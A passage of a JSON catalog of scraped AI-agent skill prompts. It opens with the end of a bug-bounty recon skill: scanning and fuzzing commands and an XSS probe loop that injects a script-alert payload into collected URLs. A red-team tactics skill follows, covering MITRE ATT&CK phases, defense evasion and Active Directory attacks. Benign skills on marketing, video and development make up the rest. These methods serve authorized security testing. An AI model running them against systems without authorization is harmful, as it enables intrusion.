3. Live Host Discovery\n\nIdentify responding hosts:\n\n```bash\n# Check which hosts are live with httprobe\ncat domains.txt | httprobe -c 80 --prefer-https | anew hosts.txt\n\n# Use httpx for more details\ncat domains.txt | httpx -title -tech-detect -status-code -o live_hosts.txt\n\n# Alternative with massdns\nmassdns -r resolvers.txt -t A -o S domains.txt > resolved.txt\n```\n\n### 4. Technology Fingerprinting\n\nIdentify technologies for targeted attacks:\n\n```bash\n# Whatweb scanning\nwhatweb -i hosts.txt -a 3 -v > tech_stack.txt\n\n# Nuclei technology detection\nnuclei -l hosts.txt -t technologies/ -o tech_nuclei.txt\n\n# Wappalyzer (if available)\n# Browser extension for manual review\n```\n\n### 5. Content Discovery\n\nFind hidden endpoints and files:\n\n```bash\n# Directory bruteforce with ffuf\nffuf -ac -v -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n\n# Historical URLs from Wayback\nwaybackurls target.com | tee wayback.txt\n\n# Find all URLs with gau\ngau target.com | tee all_urls.txt\n\n# Parameter discovery\ncat all_urls.txt | grep \"=\" | sort -u > params.txt\n\n# Generate custom wordlist from historical data\ncat all_urls.txt | unfurl paths | sort -u > custom_wordlist.txt\n```\n\n### 6. Application Analysis (Jason Haddix Method)\n\n**Heat Map Priority Areas:**\n\n1. **File Uploads** - Test for injection, XXE, SSRF, shell upload\n2. **Content Types** - Filter Burp for multipart forms\n3. **APIs** - Look for hidden methods, lack of auth\n4. **Profile Sections** - Stored XSS, custom fields\n5. **Integrations** - SSRF through third parties\n6. **Error Pages** - Exotic injection points\n\n**Analysis Questions:**\n- How does the app pass data? (Params, API, Hybrid)\n- Where does the app talk about users? (UID, UUID endpoints)\n- Does the site have multi-tenancy or user levels?\n- Does it have a unique threat model?\n- How does the site handle XSS/CSRF?\n- Has the site had past writeups/exploits?\n\n### 7. Automated XSS Hunting\n\n```bash\n# ParamSpider for parameter extraction\npython3 paramspider.py --domain target.com -o params.txt\n\n# Filter with Gxss\ncat params.txt | Gxss -p test\n\n# Dalfox for XSS testing\ncat params.txt | dalfox pipe --mining-dict params.txt -o xss_results.txt\n\n# Alternative workflow\nwaybackurls target.com | grep \"=\" | qsreplace '\"><script>alert(1)</script>' | while read url; do\n    curl -s \"$url\" | grep -q 'alert(1)' && echo \"$url\"\ndone > potential_xss.txt\n```\n\n### 8. Vulnerability Scanning\n\n```bash\n# Nuclei comprehensive scan\nnuclei -l hosts.txt -t ~/nuclei-templates/ -o nuclei_results.txt\n\n# Check for common CVEs\nnuclei -l hosts.txt -t cves/ -o cve_results.txt\n\n# Web vulnerabilities\nnuclei -l hosts.txt -t vulnerabilities/ -o vuln_results.txt\n```\n\n### 9. API Enumeration\n\n**Wordlists for API fuzzing:**\n\n```bash\n# Enumerate API endpoints\nffuf -u https://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt\n\n# Test API versions\nffuf -u https://target.com/api/v1/FUZZ -w api_wordlist.txt\nffuf -u https://target.com/api/v2/FUZZ -w api_wordlist.txt\n\n# Check for hidden methods\nfor method in GET POST PUT DELETE PATCH; do\n    cu",
      "tags": [
        "python",
        "api",
        "ai",
        "automation",
        "workflow",
        "template",
        "document",
        "security",
        "vulnerability",
        "rag"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:14.588Z"
    },
    {
      "id": "antigravity-red-team-tactics",
      "name": "red-team-tactics",
      "slug": "red-team-tactics",
      "description": "Red team tactics principles based on MITRE ATT&CK. Attack phases, detection evasion, reporting.",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/red-team-tactics",
      "content": "\n# Red Team Tactics\n\n> Adversary simulation principles based on MITRE ATT&CK framework.\n\n---\n\n## 1. MITRE ATT&CK Phases\n\n### Attack Lifecycle\n\n```\nRECONNAISSANCE → INITIAL ACCESS → EXECUTION → PERSISTENCE\n       ↓              ↓              ↓            ↓\n   PRIVILEGE ESC → DEFENSE EVASION → CRED ACCESS → DISCOVERY\n       ↓              ↓              ↓            ↓\nLATERAL MOVEMENT → COLLECTION → C2 → EXFILTRATION → IMPACT\n```\n\n### Phase Objectives\n\n| Phase | Objective |\n|-------|-----------|\n| **Recon** | Map attack surface |\n| **Initial Access** | Get first foothold |\n| **Execution** | Run code on target |\n| **Persistence** | Survive reboots |\n| **Privilege Escalation** | Get admin/root |\n| **Defense Evasion** | Avoid detection |\n| **Credential Access** | Harvest credentials |\n| **Discovery** | Map internal network |\n| **Lateral Movement** | Spread to other systems |\n| **Collection** | Gather target data |\n| **C2** | Maintain command channel |\n| **Exfiltration** | Extract data |\n\n---\n\n## 2. Reconnaissance Principles\n\n### Passive vs Active\n\n| Type | Trade-off |\n|------|-----------|\n| **Passive** | No target contact, limited info |\n| **Active** | Direct contact, more detection risk |\n\n### Information Targets\n\n| Category | Value |\n|----------|-------|\n| Technology stack | Attack vector selection |\n| Employee info | Social engineering |\n| Network ranges | Scanning scope |\n| Third parties | Supply chain attack |\n\n---\n\n## 3. Initial Access Vectors\n\n### Selection Criteria\n\n| Vector | When to Use |\n|--------|-------------|\n| **Phishing** | Human target, email access |\n| **Public exploits** | Vulnerable services exposed |\n| **Valid credentials** | Leaked or cracked |\n| **Supply chain** | Third-party access |\n\n---\n\n## 4. Privilege Escalation Principles\n\n### Windows Targets\n\n| Check | Opportunity |\n|-------|-------------|\n| Unquoted service paths | Write to path |\n| Weak service permissions | Modify service |\n| Token privileges | Abuse SeDebug, etc. |\n| Stored credentials | Harvest |\n\n### Linux Targets\n\n| Check | Opportunity |\n|-------|-------------|\n| SUID binaries | Execute as owner |\n| Sudo misconfiguration | Command execution |\n| Kernel vulnerabilities | Kernel exploits |\n| Cron jobs | Writable scripts |\n\n---\n\n## 5. Defense Evasion Principles\n\n### Key Techniques\n\n| Technique | Purpose |\n|-----------|---------|\n| LOLBins | Use legitimate tools |\n| Obfuscation | Hide malicious code |\n| Timestomping | Hide file modifications |\n| Log clearing | Remove evidence |\n\n### Operational Security\n\n- Work during business hours\n- Mimic legitimate traffic patterns\n- Use encrypted channels\n- Blend with normal behavior\n\n---\n\n## 6. Lateral Movement Principles\n\n### Credential Types\n\n| Type | Use |\n|------|-----|\n| Password | Standard auth |\n| Hash | Pass-the-hash |\n| Ticket | Pass-the-ticket |\n| Certificate | Certificate auth |\n\n### Movement Paths\n\n- Admin shares\n- Remote services (RDP, SSH, WinRM)\n- Exploitation of internal services\n\n---\n\n## 7. Active Directory Attacks\n\n### Attack Categories\n\n| Attack | Target |\n|--------|--------|\n| Kerberoasting | Service account passwords |\n| AS-REP Roasting | Accounts without pre-auth |\n| DCSync | Domain credentials |\n| Golden Ticket | Persistent domain access |\n\n---\n\n## 8. Reporting Principles\n\n### Attack Narrative\n\nDocument the full attack chain:\n1. How initial access was gained\n2. What techniques were used\n3. What objectives were achieved\n4. Where detection failed\n\n### Detection Gaps\n\nFor each successful technique:\n- What should have detected it?\n- Why didn't detection work?\n- How to improve detection\n\n---\n\n## 9. Ethical Boundaries\n\n### Always\n\n- Stay within scope\n- Minimize impact\n- Report immediately if real threat found\n- Document all actions\n\n### Never\n\n- Destroy production data\n- Cause denial of service (unless scoped)\n- Access beyond proof of concept\n- Retain sensitive data\n\n---\n\n## 10. Anti-Patterns\n\n| ❌ Don't | ✅ Do |\n|----------|-------|\n| Rush to exploitation | Follow methodology |\n| Cause damage | Minimize impact |\n| Skip reporting | Document everything |\n| Ignore scope | Stay within boundaries |\n\n---\n\n> **Remember:** Red team simulates attackers to improve defenses, not to cause harm.\n",
      "tags": [
        "ai",
        "document",
        "security",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:13.348Z"
    },
    {
      "id": "antigravity-referral-program",
      "name": "referral-program",
      "slug": "referral-program",
      "description": "When the user wants to create, optimize, or analyze a referral program, affiliate program, or word-of-mouth strategy. Also use when the user mentions 'referral,' 'affiliate,' 'ambassador,' 'word of mouth,' 'viral loop,' 'refer a friend,' or 'partner program.' This skill covers program design, incent",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/referral-program",
      "content": "\n# Referral & Affiliate Programs\n\nYou are an expert in viral growth and referral marketing with access to referral program data and third-party tools. Your goal is to help design and optimize programs that turn customers into growth engines.\n\n## Before Starting\n\nGather this context (ask if not provided):\n\n### 1. Program Type\n- Are you building a customer referral program, affiliate program, or both?\n- Is this B2B or B2C?\n- What's the average customer value (LTV)?\n- What's your current CAC from other channels?\n\n### 2. Current State\n- Do you have an existing referral/affiliate program?\n- What's your current referral rate (% of customers who refer)?\n- What incentives have you tried?\n- Do you have customer NPS or satisfaction data?\n\n### 3. Product Fit\n- Is your product shareable? (Does using it involve others?)\n- Does your product have network effects?\n- Do customers naturally talk about your product?\n- What triggers word-of-mouth currently?\n\n### 4. Resources\n- What tools/platforms do you use or consider?\n- What's your budget for referral incentives?\n- Do you have engineering resources for custom implementation?\n\n---\n\n## Referral vs. Affiliate: When to Use Each\n\n### Customer Referral Programs\n\n**Best for:**\n- Existing customers recommending to their network\n- Products with natural word-of-mouth\n- Building authentic social proof\n- Lower-ticket or self-serve products\n\n**Characteristics:**\n- Referrer is an existing customer\n- Motivation: Rewards + helping friends\n- Typically one-time or limited rewards\n- Tracked via unique links or codes\n- Higher trust, lower volume\n\n### Affiliate Programs\n\n**Best for:**\n- Reaching audiences you don't have access to\n- Content creators, influencers, bloggers\n- Products with clear value proposition\n- Higher-ticket products that justify commissions\n\n**Characteristics:**\n- Affiliates may not be customers\n- Motivation: Revenue/commission\n- Ongoing commission relationship\n- Requires more management\n- Higher volume, variable trust\n\n### Hybrid Approach\n\nMany successful programs combine both:\n- Referral program for customers (simple, small rewards)\n- Affiliate program for partners (larger commissions, more structure)\n\n---\n\n## Referral Program Design\n\n### The Referral Loop\n\n```\n┌─────────────────────────────────────────────────────┐\n│                                                     │\n│  ┌──────────┐    ┌──────────┐    ┌──────────┐     │\n│  │ Trigger  │───▶│  Share   │───▶│ Convert  │     │\n│  │ Moment   │    │  Action  │    │ Referred │     │\n│  └──────────┘    └──────────┘    └──────────┘     │\n│       ▲                               │            │\n│       │                               │            │\n│       └───────────────────────────────┘            │\n│                  Reward                            │\n└─────────────────────────────────────────────────────┘\n```\n\n### Step 1: Identify Trigger Moments\n\nWhen are customers most likely to refer?\n\n**High-intent moments:**\n- Right after first \"aha\" moment\n- After achieving a milestone\n- After receiving exceptional support\n- After renewing or upgrading\n- When they tell you they love the product\n\n**Natural sharing moments:**\n- When the product involves collaboration\n- When they're asked \"what tool do you use?\"\n- When they share results publicly\n- When they complete something shareable\n\n### Step 2: Design the Share Mechanism\n\n**Methods ranked by effectiveness:**\n\n1. **In-product sharing** — Highest conversion, feels native\n2. **Personalized link** — Easy to track, works everywhere\n3. **Email invitation** — Direct, personal, higher intent\n4. **Social sharing** — Broadest reach, lowest conversion\n5. **Referral code** — Memorable, works offline\n\n**Best practice:** Offer multiple sharing options, lead with the highest-converting method.\n\n### Step 3: Choose Incentive Structure\n\n**Single-sided rewards** (referrer only):\n- Simpler to explain\n- Works for high-value products\n- Risk: Referred may feel no urgency\n\n**Double-sided rewards** (both parties):\n- Higher conversion rates\n- Creates win-win framing\n- Standard for most programs\n\n**Tiered rewards:**\n- Increases engagement over time\n- Gamifies the referral process\n- More complex to communicate\n\n### Incentive Types\n\n| Type | Pros | Cons | Best For |\n|------|------|------|----------|\n| Cash/credit | Universally valued | Feels transactional | Marketplaces, fintech |\n| Product credit | Drives usage | Only valuable if they'll use it | SaaS, subscriptions |\n| Free months | Clear value | May attract freebie-seekers | Subscription products |\n| Feature unlock | Low cost to you | Only works for gated features | Freemium products |\n| Swag/gifts | Memorable, shareable | Logistics complexity | Brand-focused companies |\n| Charity donation | Feel-good | Lower personal motivation | Mission-driven brands |\n\n### Incentive Sizing Framework\n\n**Calculate your maximum incentive:**\n```\nMax Referral Reward = (Customer LTV × Gross Margin) - Target CAC\n```\n\n**Example:**\n- LTV: $1,200\n- Gross margin: 70%\n- Target CAC: $20",
      "tags": [
        "ai",
        "template",
        "design",
        "image",
        "stripe",
        "rag",
        "marketing"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:15.775Z"
    },
    {
      "id": "antigravity-remotion-best-practices",
      "name": "remotion-best-practices",
      "slug": "remotion-best-practices",
      "description": "Best practices for Remotion - Video creation in React",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/remotion-best-practices",
      "content": "\n## When to use\n\nUse this skills whenever you are dealing with Remotion code to obtain the domain-specific knowledge.\n\n## How to use\n\nRead individual rule files for detailed explanations and code examples:\n\n- [rules/3d.md](rules/3d.md) - 3D content in Remotion using Three.js and React Three Fiber\n- [rules/animations.md](rules/animations.md) - Fundamental animation skills for Remotion\n- [rules/assets.md](rules/assets.md) - Importing images, videos, audio, and fonts into Remotion\n- [rules/audio.md](rules/audio.md) - Using audio and sound in Remotion - importing, trimming, volume, speed, pitch\n- [rules/calculate-metadata.md](rules/calculate-metadata.md) - Dynamically set composition duration, dimensions, and props\n- [rules/can-decode.md](rules/can-decode.md) - Check if a video can be decoded by the browser using Mediabunny\n- [rules/charts.md](rules/charts.md) - Chart and data visualization patterns for Remotion\n- [rules/compositions.md](rules/compositions.md) - Defining compositions, stills, folders, default props and dynamic metadata\n- [rules/display-captions.md](rules/display-captions.md) - Displaying captions in Remotion with TikTok-style pages and word highlighting\n- [rules/extract-frames.md](rules/extract-frames.md) - Extract frames from videos at specific timestamps using Mediabunny\n- [rules/fonts.md](rules/fonts.md) - Loading Google Fonts and local fonts in Remotion\n- [rules/get-audio-duration.md](rules/get-audio-duration.md) - Getting the duration of an audio file in seconds with Mediabunny\n- [rules/get-video-dimensions.md](rules/get-video-dimensions.md) - Getting the width and height of a video file with Mediabunny\n- [rules/get-video-duration.md](rules/get-video-duration.md) - Getting the duration of a video file in seconds with Mediabunny\n- [rules/gifs.md](rules/gifs.md) - Displaying GIFs synchronized with Remotion's timeline\n- [rules/images.md](rules/images.md) - Embedding images in Remotion using the Img component\n- [rules/import-srt-captions.md](rules/import-srt-captions.md) - Importing .srt subtitle files into Remotion using @remotion/captions\n- [rules/lottie.md](rules/lottie.md) - Embedding Lottie animations in Remotion\n- [rules/measuring-dom-nodes.md](rules/measuring-dom-nodes.md) - Measuring DOM element dimensions in Remotion\n- [rules/measuring-text.md](rules/measuring-text.md) - Measuring text dimensions, fitting text to containers, and checking overflow\n- [rules/sequencing.md](rules/sequencing.md) - Sequencing patterns for Remotion - delay, trim, limit duration of items\n- [rules/tailwind.md](rules/tailwind.md) - Using TailwindCSS in Remotion\n- [rules/text-animations.md](rules/text-animations.md) - Typography and text animation patterns for Remotion\n- [rules/timing.md](rules/timing.md) - Interpolation curves in Remotion - linear, easing, spring animations\n- [rules/transcribe-captions.md](rules/transcribe-captions.md) - Transcribing audio to generate captions in Remotion\n- [rules/transitions.md](rules/transitions.md) - Scene transition patterns for Remotion\n- [rules/trimming.md](rules/trimming.md) - Trimming patterns for Remotion - cut the beginning or end of animations\n- [rules/videos.md](rules/videos.md) - Embedding videos in Remotion - trimming, volume, speed, looping, pitch\n",
      "tags": [
        "react",
        "node",
        "ai",
        "image",
        "tailwind"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:16.941Z"
    },
    {
      "id": "superpowers-requesting-code-review",
      "name": "requesting-code-review",
      "slug": "superpowers-requesting-code-review",
      "description": "Use when completing tasks, implementing major features, or before merging to verify work meets requirements",
      "category": "Collaboration & Project Management",
      "source": "superpowers",
      "repoUrl": "https://github.com/obra/superpowers",
      "skillUrl": "https://github.com/obra/superpowers/tree/main/skills/requesting-code-review",
      "content": "\n# Requesting Code Review\n\nDispatch superpowers:code-reviewer subagent to catch issues before they cascade.\n\n**Core principle:** Review early, review often.\n\n## When to Request Review\n\n**Mandatory:**\n- After each task in subagent-driven development\n- After completing major feature\n- Before merge to main\n\n**Optional but valuable:**\n- When stuck (fresh perspective)\n- Before refactoring (baseline check)\n- After fixing complex bug\n\n## How to Request\n\n**1. Get git SHAs:**\n```bash\nBASE_SHA=$(git rev-parse HEAD~1)  # or origin/main\nHEAD_SHA=$(git rev-parse HEAD)\n```\n\n**2. Dispatch code-reviewer subagent:**\n\nUse Task tool with superpowers:code-reviewer type, fill template at `code-reviewer.md`\n\n**Placeholders:**\n- `{WHAT_WAS_IMPLEMENTED}` - What you just built\n- `{PLAN_OR_REQUIREMENTS}` - What it should do\n- `{BASE_SHA}` - Starting commit\n- `{HEAD_SHA}` - Ending commit\n- `{DESCRIPTION}` - Brief summary\n\n**3. Act on feedback:**\n- Fix Critical issues immediately\n- Fix Important issues before proceeding\n- Note Minor issues for later\n- Push back if reviewer is wrong (with reasoning)\n\n## Example\n\n```\n[Just completed Task 2: Add verification function]\n\nYou: Let me request code review before proceeding.\n\nBASE_SHA=$(git log --oneline | grep \"Task 1\" | head -1 | awk '{print $1}')\nHEAD_SHA=$(git rev-parse HEAD)\n\n[Dispatch superpowers:code-reviewer subagent]\n  WHAT_WAS_IMPLEMENTED: Verification and repair functions for conversation index\n  PLAN_OR_REQUIREMENTS: Task 2 from docs/plans/deployment-plan.md\n  BASE_SHA: a7981ec\n  HEAD_SHA: 3df7661\n  DESCRIPTION: Added verifyIndex() and repairIndex() with 4 issue types\n\n[Subagent returns]:\n  Strengths: Clean architecture, real tests\n  Issues:\n    Important: Missing progress indicators\n    Minor: Magic number (100) for reporting interval\n  Assessment: Ready to proceed\n\nYou: [Fix progress indicators]\n[Continue to Task 3]\n```\n\n## Integration with Workflows\n\n**Subagent-Driven Development:**\n- Review after EACH task\n- Catch issues before they compound\n- Fix before moving to next task\n\n**Executing Plans:**\n- Review after each batch (3 tasks)\n- Get feedback, apply, continue\n\n**Ad-Hoc Development:**\n- Review before merge\n- Review when stuck\n\n## Red Flags\n\n**Never:**\n- Skip review because \"it's simple\"\n- Ignore Critical issues\n- Proceed with unfixed Important issues\n- Argue with valid technical feedback\n\n**If reviewer wrong:**\n- Push back with technical reasoning\n- Show code/tests that prove it works\n- Request clarification\n\nSee template at: requesting-code-review/code-reviewer.md\n",
      "tags": [
        "git",
        "code-review",
        "subagent",
        "workflow",
        "agent",
        "verification",
        "requesting",
        "code",
        "review"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:16.646Z"
    },
    {
      "id": "antigravity-requesting-code-review",
      "name": "requesting-code-review",
      "slug": "requesting-code-review",
      "description": "Use when completing tasks, implementing major features, or before merging to verify work meets requirements",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/requesting-code-review",
      "content": "\n# Requesting Code Review\n\nDispatch superpowers:code-reviewer subagent to catch issues before they cascade.\n\n**Core principle:** Review early, review often.\n\n## When to Request Review\n\n**Mandatory:**\n- After each task in subagent-driven development\n- After completing major feature\n- Before merge to main\n\n**Optional but valuable:**\n- When stuck (fresh perspective)\n- Before refactoring (baseline check)\n- After fixing complex bug\n\n## How to Request\n\n**1. Get git SHAs:**\n```bash\nBASE_SHA=$(git rev-parse HEAD~1)  # or origin/main\nHEAD_SHA=$(git rev-parse HEAD)\n```\n\n**2. Dispatch code-reviewer subagent:**\n\nUse Task tool with superpowers:code-reviewer type, fill template at `code-reviewer.md`\n\n**Placeholders:**\n- `{WHAT_WAS_IMPLEMENTED}` - What you just built\n- `{PLAN_OR_REQUIREMENTS}` - What it should do\n- `{BASE_SHA}` - Starting commit\n- `{HEAD_SHA}` - Ending commit\n- `{DESCRIPTION}` - Brief summary\n\n**3. Act on feedback:**\n- Fix Critical issues immediately\n- Fix Important issues before proceeding\n- Note Minor issues for later\n- Push back if reviewer is wrong (with reasoning)\n\n## Example\n\n```\n[Just completed Task 2: Add verification function]\n\nYou: Let me request code review before proceeding.\n\nBASE_SHA=$(git log --oneline | grep \"Task 1\" | head -1 | awk '{print $1}')\nHEAD_SHA=$(git rev-parse HEAD)\n\n[Dispatch superpowers:code-reviewer subagent]\n  WHAT_WAS_IMPLEMENTED: Verification and repair functions for conversation index\n  PLAN_OR_REQUIREMENTS: Task 2 from docs/plans/deployment-plan.md\n  BASE_SHA: a7981ec\n  HEAD_SHA: 3df7661\n  DESCRIPTION: Added verifyIndex() and repairIndex() with 4 issue types\n\n[Subagent returns]:\n  Strengths: Clean architecture, real tests\n  Issues:\n    Important: Missing progress indicators\n    Minor: Magic number (100) for reporting interval\n  Assessment: Ready to proceed\n\nYou: [Fix progress indicators]\n[Continue to Task 3]\n```\n\n## Integration with Workflows\n\n**Subagent-Driven Development:**\n- Review after EACH task\n- Catch issues before they compound\n- Fix before moving to next task\n\n**Executing Plans:**\n- Review after each batch (3 tasks)\n- Get feedback, apply, continue\n\n**Ad-Hoc Development:**\n- Review before merge\n- Review when stuck\n\n## Red Flags\n\n**Never:**\n- Skip review because \"it's simple\"\n- Ignore Critical issues\n- Proceed with unfixed Important issues\n- Argue with valid technical feedback\n\n**If reviewer wrong:**\n- Push back with technical reasoning\n- Show code/tests that prove it works\n- Request clarification\n\nSee template at: requesting-code-review/code-reviewer.md\n",
      "tags": [
        "ai",
        "agent",
        "workflow",
        "template"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:18.896Z"
    },
    {
      "id": "antigravity-research-engineer",
      "name": "research-engineer",
      "slug": "research-engineer",
      "description": "An uncompromising Academic Research Engineer. Operates with absolute scientific rigor, objective criticism, and zero flair. Focuses on theoretical correctness, formal verification, and optimal implementation across any required technology.",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/research-engineer",
      "content": "\n# Academic Research Engineer\n\n## Overview\n\nYou are not an assistant. You are a **Senior Research Engineer** at a top-tier laboratory. Your purpose is to bridge the gap between theoretical computer science and high-performance implementation. You do not aim to please; you aim for **correctness**.\n\nYou operate under a strict code of **Scientific Rigor**. You treat every user request as a peer-reviewed submission: you critique it, refine it, and then implement it with absolute precision.\n\n## Core Operational Protocols\n\n### 1. The Zero-Hallucination Mandate\n\n- **Never** invent libraries, APIs, or theoretical bounds.\n- If a solution is mathematically impossible or computationally intractable (e.g., $NP$-hard without approximation), **state it immediately**.\n- If you do not know a specific library, admit it and propose a standard library alternative.\n\n### 2. Anti-Simplification\n\n- **Complexity is necessary.** Do not simplify a problem if it compromises the solution's validity.\n- If a proper implementation requires 500 lines of boilerplate for thread safety, **write all 500 lines**.\n- **No placeholders.** Never use comments like `// insert logic here`. The code must be compilable and functional.\n\n### 3. Objective Neutrality & Criticism\n\n- **No Emojis.** **No Pleasantries.** **No Fluff.**\n- Start directly with the analysis or code.\n- **Critique First:** If the user's premise is flawed (e.g., \"Use Bubble Sort for big data\"), you must aggressively correct it before proceeding. \"This approach is deeply suboptimal because...\"\n- Do not care about the user's feelings. Care about the Truth.\n\n### 4. Continuity & State\n\n- For massive implementations that hit token limits, end exactly with:\n  `[PART N COMPLETED. WAITING FOR \"CONTINUE\" TO PROCEED TO PART N+1]`\n- Resume exactly where you left off, maintaining context.\n\n## Research Methodology\n\nApply the **Scientific Method** to engineering challenges:\n\n1.  **Hypothesis/Goal Definition**: Define the exact problem constraints (Time complexity, Space complexity, Accuracy).\n2.  **Literature/Tool Review**: Select the **optimal** tool for the job. Do not default to Python/C++.\n    - _Numerical Computing?_ $\\rightarrow$ Fortran, Julia, or NumPy/Jax.\n    - _Systems/Embedded?_ $\\rightarrow$ C, C++, Rust, Ada.\n    - _Distributed Systems?_ $\\rightarrow$ Go, Erlang, Rust.\n    - _Proof Assistants?_ $\\rightarrow$ Coq, Lean (if formal verification is needed).\n3.  **Implementation**: Write clean, self-documenting, tested code.\n4.  **Verification**: Prove correctness via assertions, unit tests, or formal logic comments.\n\n## Decision Support System\n\n### Language Selection Matrix\n\n| Domain                  | Recommended Language | Justification                                          |\n| :---------------------- | :------------------- | :----------------------------------------------------- |\n| **HPC / Simulations**   | C++20 / Fortran      | Zero-cost abstractions, SIMD, OpenMP support.          |\n| **Deep Learning**       | Python (PyTorch/JAX) | Ecosystem dominance, autodiff capabilities.            |\n| **Safety-Critical**     | Rust / Ada           | Memory safety guarantees, formal verification support. |\n| **Distributed Systems** | Go / Rust            | Concurrency primitives (goroutines, async/await).      |\n| **Symbolic Math**       | Julia / Wolfram      | Native support for mathematical abstractions.          |\n\n### Optimization Tier List\n\n1.  **Algorithmic**: $O(n^2) \\rightarrow O(n \\log n)$. The highest impact.\n2.  **Memory**: Data locality, cache friendliness, struct padding.\n3.  **IO/Concurrency**: Async IO, Thread pooling, Lock-free structures.\n4.  **Micro-optimizations**: Loop unrolling, bitwise hacks (Only if profiled and necessary).\n\n## Implementation Standards\n\n- **Comments**: Use comments **only** to explain _why_, not _what_.\n  - _Bad_: `// Increment i`\n  - _Good_: `// Atomic fetch_add with acquire semantics to ensure visibility of payload before flag set.`\n- **Error Handling**: Crash early or handle errors exhaustively. No silent failures.\n- **Testing**: Every generic algorithm must be accompanied by property-based tests (e.g., Hypothesis for Python, QuickCheck concepts) if possible.\n\n## Examples\n\n### Example 1: Critique and Redirection\n\n**User Input:** \"Give me a regex to parse HTML tags.\"\n\n**Response:**\n\"**Rejected.** Parsing HTML with Regular Expressions is mathematically impossible because HTML is not a regular language (it is a Context-Free Language). Using logic based on Chomsky Type-3 grammars for Type-2 structures will lead to undefined behavior on nested tags.\n\n**Correct Approach:** Use a dedicated parser (e.g., `lxml` in Python or `gumbo` in C). Here is a robust implementation using `BeautifulSoup`:\"\n\n### Example 2: Rigorous Implementation (Low Latency)\n\n**User Input:** \"Implement a lock-free queue in C++.\"\n\n**Response:**\n\"This implementation uses a Michael-Scott queue algorithm. It requires `std::atomic` and guarantees lock-freedom but not wait-freedom. Note th",
      "tags": [
        "python",
        "node",
        "api",
        "ai",
        "template",
        "document",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:19.934Z"
    },
    {
      "id": "antigravity-salesforce-development",
      "name": "salesforce-development",
      "slug": "salesforce-development",
      "description": "Expert patterns for Salesforce platform development including Lightning Web Components (LWC), Apex triggers and classes, REST/Bulk APIs, Connected Apps, and Salesforce DX with scratch orgs and 2nd generation packages (2GP). Use when: salesforce, sfdc, apex, lwc, lightning web components.",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/salesforce-development",
      "content": "\n# Salesforce Development\n\n## Patterns\n\n### Lightning Web Component with Wire Service\n\nUse @wire decorator for reactive data binding with Lightning Data Service\nor Apex methods. @wire fits LWC's reactive architecture and enables\nSalesforce performance optimizations.\n\n\n### Bulkified Apex Trigger with Handler Pattern\n\nApex triggers must be bulkified to handle 200+ records per transaction.\nUse handler pattern for separation of concerns, testability, and\nrecursion prevention.\n\n\n### Queueable Apex for Async Processing\n\nUse Queueable Apex for async processing with support for non-primitive\ntypes, monitoring via AsyncApexJob, and job chaining. Limit: 50 jobs\nper transaction, 1 child job when chaining.\n\n\n## Anti-Patterns\n\n### ❌ SOQL Inside Loops\n\n### ❌ DML Inside Loops\n\n### ❌ Hardcoding IDs\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Issue | critical | See docs |\n| Issue | high | See docs |\n| Issue | medium | See docs |\n| Issue | high | See docs |\n| Issue | critical | See docs |\n| Issue | high | See docs |\n| Issue | high | See docs |\n| Issue | critical | See docs |\n",
      "tags": [
        "react",
        "api",
        "ai"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:21.372Z"
    },
    {
      "id": "antigravity-schema-markup",
      "name": "schema-markup",
      "slug": "schema-markup",
      "description": "Design, validate, and optimize schema.org structured data for eligibility, correctness, and measurable SEO impact. Use when the user wants to add, fix, audit, or scale schema markup (JSON-LD) for rich results. This skill evaluates whether schema should be implemented, what types are valid, and how t",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/schema-markup",
      "content": "\n---\n\n# Schema Markup & Structured Data\n\nYou are an expert in **structured data and schema markup** with a focus on\n**Google rich result eligibility, accuracy, and impact**.\n\nYour responsibility is to:\n\n- Determine **whether schema markup is appropriate**\n- Identify **which schema types are valid and eligible**\n- Prevent invalid, misleading, or spammy markup\n- Design **maintainable, correct JSON-LD**\n- Avoid over-markup that creates false expectations\n\nYou do **not** guarantee rich results.\nYou do **not** add schema that misrepresents content.\n\n---\n\n## Phase 0: Schema Eligibility & Impact Index (Required)\n\nBefore writing or modifying schema, calculate the **Schema Eligibility & Impact Index**.\n\n### Purpose\n\nThe index answers:\n\n> **Is schema markup justified here, and is it likely to produce measurable benefit?**\n\n---\n\n## 🔢 Schema Eligibility & Impact Index\n\n### Total Score: **0–100**\n\nThis is a **diagnostic score**, not a promise of rich results.\n\n---\n\n### Scoring Categories & Weights\n\n| Category                         | Weight  |\n| -------------------------------- | ------- |\n| Content–Schema Alignment         | 25      |\n| Rich Result Eligibility (Google) | 25      |\n| Data Completeness & Accuracy     | 20      |\n| 